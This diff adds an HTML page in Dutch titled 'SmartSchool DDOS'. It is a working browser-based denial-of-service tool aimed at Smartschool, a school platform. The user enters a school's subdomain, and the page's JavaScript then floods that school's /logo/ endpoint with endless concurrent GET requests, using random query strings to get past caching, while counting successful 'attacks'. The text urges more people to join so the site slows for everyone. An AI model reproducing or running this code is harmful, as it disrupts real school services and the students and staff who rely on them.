@@ -1,0 +1,105 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+  <meta charset="utf-8" />
+  <title>Smartschool DDOS</title>
+  <link rel="stylesheet" href="candy.css">
+</head>
+
+<body>
+  <center><img src="logo.png" style="width: 10vw; min-width: 100px;" >
+ <h1 class="masthead">SmartSchool DDOS</h1> 
+</center>
+  <h3 class="notice">
+    <p>Het zal ongeveer 2 minuten duren tot dat Smartschool niet werkt. Hoe meer mensen dit doen hoe trager SmartSchool wordt voor iedereen. Je gsm gaat een beetje traag zijn tijdens de DDOS. De "logo" van Smartschool is een zwakte punt dus daarom werkt dit.</p>
+    <br>
+  <br>
+  <p>DIT APP WERKT ALLEEN ALS JE OP DIT SCHERM ZIT EN MEESTAL SMARTSCHOOL LIGT PLAT ALLEEN VOOR MENSEN OP HETZELFDE NETWERK</p>
+  </h3>
+<center>
+  <div id="inputForm">
+   <h1> <label for="schoolInput">Typ hier de naam van uw school:</label>
+    <input type="text" id="schoolInput" style="height:50px;font-size:20pt;" placeholder="Naam school">
+    <button id="startButton">Start DDOS</button></h1>
+   <h6> <p>Voorbeelden: <br>
+      "sjcgent" als je sjcgent.smartschool.be gebruikt <br>
+      "edugo" als je edugo.smartschool.be gebruikt <br></p></h6>
+  </div>
+</center>
+  <div id="stats">
+    <!-- Stats will be displayed here -->
+  </div>
+
+  <script>
+    var targets = {};
+
+    var statsEl = document.getElementById('stats');
+    var inputForm = document.getElementById('inputForm'); 
+    var schoolInput = document.getElementById('schoolInput');
+    var startButton = document.getElementById('startButton');
+
+    function printStats() {
+      statsEl.innerHTML = '<table width="100%"><thead><tr><th>Website</th><th>Aantal aanvallen</th><th>Aantal aanvallen gelukt</th></tr></thead><br><tbody>' +
+        Object.entries(targets).map(([target, { number_of_requests, number_of_errored_responses }]) =>
+          '<tr><td>' + target + '</td><td>' + number_of_requests + '</td><td>' + number_of_errored_responses + '</td></tr>'
+        ).join('') + '</tbody></table>';
+    }
+    setInterval(printStats, 1000);
+
+    var CONCURRENCY_LIMIT = 1000;
+    var queue = [];
+
+    async function fetchWithTimeout(resource, options) {
+      const controller = new AbortController();
+      const id = setTimeout(() => controller.abort(), options.timeout);
+      return fetch(resource, {
+        method: 'GET',
+        mode: 'no-cors',
+        signal: controller.signal
+      }).then((response) => {
+        clearTimeout(id);
+        return response;
+      }).catch((error) => {
+        clearTimeout(id);
+        throw error;
+      });
+    }
+
+    async function flood(target) {
+      for (var i = 0;; ++i) {
+        if (queue.length > CONCURRENCY_LIMIT) {
+          await queue.shift();
+        }
+        rand = i % 3 === 0 ? '' : ('?' + Math.random() * 1000);
+        queue.push(
+          fetchWithTimeout(target + rand, { timeout: 1000 })
+            .catch((error) => {
+              if (error.code === 20 /* ABORT */) {
+                return;
+              }
+              targets[target].number_of_errored_responses++;
+            })
+            .then((response) => {
+              if (response && !response.ok) {
+                targets[target].number_of_errored_responses++;
+              }
+              targets[target].number_of_requests++;
+            })
+        );
+      }
+    }
+
+    startButton.addEventListener('click', function () {
+      var schoolName = schoolInput.value.trim();
+      if (schoolName !== '') {
+        targets['https://' + schoolName + '.smartschool.be/logo/'] = { number_of_requests: 0, number_of_errored_responses: 0 };
+        inputForm.style.display = 'none';
+        Object.keys(targets).map(flood);
+      }
+    });
+
+  </script>
+</body>
+
+</html>
